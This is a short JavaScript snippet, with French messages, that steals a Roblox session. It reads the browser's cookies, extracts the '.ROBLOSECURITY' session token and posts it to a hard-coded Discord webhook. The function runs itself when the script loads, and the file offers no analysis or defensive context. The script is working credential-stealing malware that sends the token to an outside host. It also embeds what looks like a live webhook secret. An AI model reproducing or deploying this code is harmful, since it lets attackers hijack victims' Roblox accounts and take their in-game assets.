const webhookUrl = 'https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK';
const cookieName = '.ROBLOSECURITY';

function getCookies() {
  return document.cookie.split(';').reduce((acc, c) => {
 const [name, ...value] = c.trim().split('=');
 return { ...acc, [name]: value.join('=') };
  }, {});
}

function stealCookie() {
  const cookies = getCookies();
  if (cookies[cookieName]) {
 fetch(webhookUrl, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({
 embeds: [{
 title: `Cookie volé de ${document.title}`,
 description: `Cookie .ROBLOSECURITY : \`${cookies[cookieName]}\``,
 color: 0x00FF00,
 }],
 }),
 })
 .then(() => console.log('Cookie envoyé avec succès !'))
 .catch(() => console.error('Erreur d\'envoi du cookie.'));
  } else {
 console.error('Aucun cookie ROBLOX trouvé.');
  }
}

stealCookie();
